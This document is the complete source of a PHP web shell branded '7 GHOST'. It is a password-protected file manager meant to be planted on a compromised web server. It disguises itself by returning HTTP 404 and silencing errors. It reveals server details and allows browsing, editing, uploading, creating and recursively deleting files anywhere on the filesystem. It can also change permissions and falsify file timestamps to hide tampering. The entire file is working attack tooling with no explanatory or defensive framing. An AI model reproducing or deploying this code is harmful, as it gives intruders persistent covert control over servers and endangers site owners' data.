<?php 
@set_time_limit(0);
@ob_clean();
@http_response_code(404);
error_reporting(0);
session_start();
$type = $_REQUEST['type'];
$path = $_REQUEST['path'];
$data = $_SERVER;
$website_path = $data['DOCUMENT_ROOT'];
$file_path = $data['SCRIPT_FILENAME'];
$now_path = dirname($file_path);
$web_url = $data['REQUEST_SCHEME']."://".$data['SERVER_NAME'];
$hashed_password = '$2a$12$6fEMiFFtcBkoYUkDHdcX8OmtE3fdKem/dga40xD5Ir3P3Ajp8BYye';

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if (isset($_POST['password']) && password_verify($_POST['password'], $hashed_password)) {
        $_SESSION['loggedin'] = true;
    } else {
        echo '
        <form method="post" style="text-align: center; margin-top: 20%;">
            <input type="password" name="password" placeholder="Enter Password" required>
            <button type="submit">Login</button>
        </form>';
        exit;
    }
}

if(!empty($path)){
    $file_path = $path;
    $now_path = $path;
}
if($type == 1){
    $now_path = $path;
}
$file_path_array = explode('/', $file_path);
if(!is_dir($now_path)){
    $now_path = dirname($now_path);
}
$can_read = false;
if (is_readable($now_path)) {
    $can_read = true;
}
$can_write = false;
if (is_writable($now_path)) {
    $can_write = true;
}
$sy_path = str_replace($website_path, '', $now_path);
$now_url = $web_url.$sy_path;
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <title>7 GHOST</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
</head>
<body>
<div class="jumbotron text-center" style="padding: 1rem 0rem;">
  <h1 style="font-size:2rem;font-weight: bold;margin: 1rem 0;">7 GHOST</h1>
</div>
<div class="container">
  <div class="row">
      <p>Server IP: <?php echo $data['SERVER_ADDR'];?></p>
      <p>Server Software: <?php echo $data['SERVER_SOFTWARE'];?></p>
      <p>OS: <?php echo PHP_OS;?></p>
      <p>Website: <?php echo $data['HTTP_HOST'];?></p>
      <p>User: <?php echo get_current_user();?></p>
      <p>
            <a href="?path=<?php echo $website_path;?>">Project</a>
      </p>
  </div>
  <div class="row">
      <p>
          Path: 
          <?php 
          $file_now_path = "";
          foreach($file_path_array as $k=>$v){
          ?>
            <?php if(empty($v)){ ?>
            <a href="?path=/">-</a>
            <?php }else{ 
                    if(empty($file_now_url)){
                        $file_now_url = $v;
                    }else{
                        $file_now_url = $file_now_url . '/' .$v;
                    }
                    $file_now_path = $file_now_path . "/" . $v;?>
                    /<a href="?path=<?php echo $file_now_path;?>"><?php echo trim($v);?></a><?php } ?>
          <?php }?>
          &nbsp;&nbsp;&nbsp;&nbsp;<span <?php if($can_read){?>style="color:green;"<?php }else{ ?>style="color:red;"<?php }?>>Readable</span> | <span <?php if($can_write){?>style="color:green;"<?php }else{ ?>style="color:red;"<?php }?>>Writeable</span>
      </p>
  </div>
  <?php if($type == 2 || $type == 3){ 
    if($type == 3){
        $file_content = $_REQUEST['file_content'];
        $content_result = file_put_contents($path, $file_content);
        if ($content_result) {
            echo '<div class="alert alert-success" role="alert">File content modified successfully!</div>';
        }else{
            echo '<div class="alert alert-danger" role="alert">Failed to modify file content!</div>';
        }
    }
  ?>
    <div class="row">
        <form action="?type=3" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <?php $content = file_get_contents($file_path);?>
            <textarea class="form-control" id="exampleFormControlTextarea1" name="file_content" rows="20" cols="100"><?php echo htmlspecialchars($content);?></textarea>
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
  <?php }else if($type == 4){ 
    $file_new_name = $_POST['file_new_name'];
    if(!empty($file_new_name)){
        $rename_result = rename($file_path, $now_path.'/'.$file_new_name);
        if($rename_result){
            echo '<div class="alert alert-success" role="alert">File renamed successfully!</div>';
            $file_path = $now_path.'/'.$file_new_name;
        }else{
            echo '<div class="alert alert-danger" role="alert">Failed to rename file!</div>';
        }
    }
  ?>
    <div class="row">
        <form action="?type=4" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <?php $content = file_get_contents($file_path);?>
             <input type="text" class="form-control" id="file_new_name" name="file_new_name" value="<?php echo basename($file_path);?>">
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
    <?php }else if($type == 5){ 
        $new_chmod = trim($_POST['new_chmod']);
        if(!empty($new_chmod)){
            if (chmod($file_path, octdec($new_chmod))) {
                echo '<div class="alert alert-success" role="alert">File permissions changed successfully!</div>';
                $old_chmod = $new_chmod;
            }else{
                echo '<div class="alert alert-danger" role="alert">Failed to change file permissions!</div>';
            }
        }else{
            $permissions = fileperms($file_path);
            $old_chmod = substr(sprintf('%o', $permissions), -4);
        }
   ?>
    <div class="row">
        <form action="?type=5" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <?php $content = file_get_contents($file_path);?>
             <input type="text" class="form-control" id="new_chmod" name="new_chmod" value="<?php echo $old_chmod;?>">
          </div>
          <button type="submit" class="btn btn-success">Edit</button>
        </form>
    </div>
    <?php }else if($type == 6){ 
        $new_name = trim($_POST['new_name']);
        $new_content = trim($_POST['new_content']);
        if(!empty($new_name)){
            if(is_file($now_path.'/'.$new_name)){
                echo '<div class="alert alert-danger" role="alert">File already exists!</div>';
            }else{
                $file = fopen($now_path.'/'.$new_name, 'w');
                if ($file) {
                    if (fwrite($file, $new_content)) {
                        echo '<div class="alert alert-success" role="alert">File created successfully!</div>';
                    } else {
                        echo '<div class="alert alert-danger" role="alert">Failed to write file!</div>';
                    }
                    fclose($file);
                } else {
                    echo '<div class="alert alert-danger" role="alert">Failed to open file!</div>';
                }
            }
        }
   ?>
    <div class="row">
        <form action="?type=6" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <input type="text" class="form-control" id="new_name" name="new_name" value="<?php echo $new_name;?>" placeholder="New File Name">
          </div>
          <div class="form-group">
             <textarea class="form-control" id="new_content" name="new_content" rows="20" cols="100" placeholder="New File Content"><?php echo htmlspecialchars($new_content);?></textarea>
          </div>
          <button type="submit" class="btn btn-success">Create Now</button>
        </form>
    </div>
    <?php }else if($type == 7){ 
        $new_name = trim($_POST['new_name']);
        if(!empty($new_name)){
            if (!is_dir($now_path . '/' . $new_name)) {
                if (mkdir($now_path . '/' . $new_name)) {
                    echo '<div class="alert alert-success" role="alert">Directory created successfully!</div>';
                } else {
                    echo '<div class="alert alert-success" role="alert">Failed to create directory!</div>';
                }
            }else{
                echo '<div class="alert alert-success" role="alert">Directory already exists!</div>';
            }
        }
   ?>
    <div class="row">
        <form action="?type=7" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <input type="text" class="form-control" id="new_name" name="new_name" value="<?php echo $new_name;?>" placeholder="New Folder Name">
          </div>
          <button type="submit" class="btn btn-success">Create Now</button>
        </form>
    </div>
    <?php }else if($type == 8){ 
        $new_date = trim($_POST['new_date']);
        $new_time = trim($_POST['new_time']);
        
        if(!empty($new_date) && !empty($new_time)){
            $timestamp = strtotime($new_date . ' ' . $new_time);
            if($timestamp !== false){
                if(touch($file_path, $timestamp)){
                    echo '<div class="alert alert-success" role="alert">File modification time changed successfully!</div>';
                }else{
                    echo '<div class="alert alert-danger" role="alert">Failed to change file modification time!</div>';
                }
            }else{
                echo '<div class="alert alert-danger" role="alert">Invalid date/time format!</div>';
            }
        }
        
        // Get current modification time
        $current_timestamp = filemtime($file_path);
        $current_date = date('Y-m-d', $current_timestamp);
        $current_time = date('H:i:s', $current_timestamp);
   ?>
    <div class="row">
        <form action="?type=8" method="post">
          <input type="hidden" id="path" name="path" value="<?php echo $file_path;?>"/>
          <div class="form-group">
             <label>Date (YYYY-MM-DD)</label>
             <input type="date" class="form-control" id="new_date" name="new_date" value="<?php echo $current_date;?>">
          </div>
          <div class="form-group">
             <label>Time (HH:MM:SS)</label>
             <input type="time" class="form-control" id="new_time" name="new_time" value="<?php echo $current_time;?>" step="1">
          </div>
          <button type="submit" class="btn btn-success">Change Time</button>
        </form>
    </div>
  <?php }else{ ?>
  <?php 
    if($_POST['act'] == 'del'){
        $delete_file_list = $_POST['childcheck'];
        if(!empty($delete_file_list)){
            $count = 0;
            $fail_count = 0;
            foreach ($delete_file_list as $k=>$v){
                if(is_dir($v)){
                    // Recursive directory deletion
                    $del_result = deleteDirectory($v);
                }else{
                    $del_result = unlink($v);
                }
                if($del_result){
                    $count++;
                }else{
                    $fail_count++;
                }
            }
            if($count > 0){
                echo '<div class="alert alert-success" role="alert">Deleted '.$count.' items successfully!</div>';
            }
            if($fail_count > 0){
                echo '<div class="alert alert-danger" role="alert">Failed to delete '.$fail_count.' items!</div>';
            }
        }
    }
    if($_POST['act'] == 'upload'){
        $targetFile = $now_path . '/' . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $targetFile)) {
            echo '<div class="alert alert-success" role="alert">File '.htmlspecialchars(basename($_FILES["fileToUpload"]["name"])).' uploaded successfully!</div>';
        } else {
            echo '<div class="alert alert-danger" role="alert">File upload failed!</div>';
        }
    }
    $file_list = scandir($now_path);
    $file_list = sortByFolder($now_path, $file_list);
  ?>
  <div class="row">
      <div class="col-12" style="margin-bottom: 1rem;">
        <form action="?path=<?php echo $file_path;?>" method="post" enctype="multipart/form-data">
            <input type="hidden" name="act" value="upload"/>
            <input class="form-control form-control-sm" id="formFileSm" name="fileToUpload" type="file" style="width: 200px;display: inline-block;">
            <button type="submit" class="btn btn-info btn-sm">Upload</button>
            <a class="btn btn-primary btn-sm" href="?path=<?php echo $file_path;?>&type=6">Create File</a>
            <a class="btn btn-success btn-sm" href="?path=<?php echo $file_path;?>&type=7">Create Folder</a>
        </form>
      </div>
      <form action="?path=<?php echo $file_path;?>" method="post">
      <div class="col-12" style="margin-bottom: 1rem;">
        <input type="hidden" name="act" value="del"/>
        <button type="submit" class="btn btn-danger btn-xs">Delete Selected</button>
      </div>
      <table class="table table-bordered">
        <thead>
          <tr>
            <th>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" value="1" id="allcheck" name="allcheck">
                </div>
            </th>  
            <th>Name</th>
            <th>Url</th>
            <th>Size</th>
            <th>Modify</th>
            <th>Permission</th>
            <th>Action</th>
          </tr>
        </thead>
        <tbody>
          <?php 
          if(!empty($file_list) && count($file_list) > 2){
          foreach($file_list as $k=>$v){
           if(!($v == '.' || $v == '..')){
               $file_url = $now_path . '/' .$v;
          ?>
          <tr>
            <th>
                <div class="form-check">
                  <input class="form-check-input" type="checkbox" value="<?php echo $file_url;?>" name="childcheck[]">
                </div>
            </th> 
            <td>
                <?php 
                 if(is_dir($file_url)){
                     echo '<a href="?path='.$file_url.'&type=1" style="color: green;font-weight:bold;">
                     <i class="bi bi-folder" style="vertical-align: middle;">
                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-folder" viewBox="0 0 16 16">
                        <path d="M.54 3.87.5 3a2 2 0 0 1 2-2h3.672a2 2 0 0 1 1.414.586l.828.828A2 2 0 0 0 9.828 3h3.982a2 2 0 0 1 1.992 2.181l-.637 7A2 2 0 0 1 13.174 14H2.826a2 2 0 0 1-1.991-1.819l-.637-7a1.99 1.99 0 0 1 .342-1.31zM2.19 4a1 1 0 0 0-.996 1.09l.637 7a1 1 0 0 0 .995.91h10.348a1 1 0 0 0 .995-.91l.637-7A1 1 0 0 0 13.81 4H2.19zm4.69-1.707A1 1 0 0 0 6.172 2H2.5a1 1 0 0 0-1 .981l.006.139C1.72 3.042 1.95 3 2.19 3h5.396l-.707-.707z"/>
                        </svg>
                    </i>'.$v.'</a>';
                 }else{
                     echo '<a href="?path='.$file_url.'&type=2">'.$v.'</a>';
                 }
                ?>
            </td>
            <td>
                <?php if(!is_dir($file_url)){ ?>
                <a href="<?php echo $now_url.'/'.$v;?>" target="_blank">click visit</a>
                <?php } ?>
            </td>
            <td>
                <?php 
                 if(is_dir($file_url)){
                     echo '<font color="green" style="font-weight: bold;">Directory</font>';
                 }else{
                     echo getFileSize($file_url);
                 }
                ?>
            </td>
            <td>
                <?php 
                $modificationTime = filemtime($file_url);
                echo date("Y-m-d H:i:s", $modificationTime);
                ?>
            </td>
            <td>
                <?php $permission = getFilePermission($file_url);
                    if(strpos($permission, 'w') !== false){
                        echo '<font color="green" style="font-weight: bold;">'.$permission.'</font>';
                    }else{
                        echo '<font color="red" style="font-weight: bold;">'.$permission.'</font>';
                    }
                ?>
            </td>
            <td>
                <a class="btn btn-primary btn-xs" href="?path=<?php echo $file_url;?>&type=4">Rename</a>
                <a class="btn btn-info btn-xs" href="?path=<?php echo $file_url;?>&type=2">Edit</a>
                <a class="btn btn-warning btn-xs" href="?path=<?php echo $file_url;?>&type=5">Chmod</a>
                <a class="btn btn-success btn-xs" href="?path=<?php echo $file_url;?>&type=8">Chtime</a>
            </td>
          </tr>
          <?php }}}else{ ?>
          <tr>
              <td colspan="7" style="text-align: center;color:red;">
                  No Files!
              </td>
          </tr>
          <?php }?>
        </tbody>
      </table>
      </form>
  </div>
  <?php }?>
</div>
<script>
    $(function(){
        $('#allcheck').click(function(){
            if($('#allcheck').is(":checked")){
                $('input[name="childcheck[]"]').each(function(){
                    $(this).attr('checked', true);
                })
            }else{
                $('input[name="childcheck[]"]').each(function(){
                    $(this).attr('checked', false);
                })
            }
        })
    })
</script>
<?php 
function getFileSize($file_url){
    $file_size = filesize($file_url);
    if($file_size > 1024 * 1024){
        $file_size = round($file_size / (1024 * 1024), 2).' MB';
    }else if($file_size > 1024){
        $file_size = round($file_size / 1024, 2).' KB'; 
    }else{
        $file_size = $file_size.' B'; 
    }
    return $file_size;
}

function getFilePermission($filename) {
    clearstatcache(true, $filename);
    $perms = fileperms($filename);
    if (($perms & 0xC000) === 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) === 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) === 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) === 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) === 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) === 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) === 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function sortByFolder($now_path, $all_list){
    $folder_list = array();
    $file_list = array();
    foreach ($all_list as $k=>$v){
        if(is_dir($now_path.'/'.$v)){
            $folder_list[] = $v;
        }else{
            $file_list[] = $v;
        }
    }
    sort($folder_list);
    sort($file_list);
    $all_list = array_merge($folder_list, $file_list);
    return $all_list;
}

function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
?>
</body>
</html>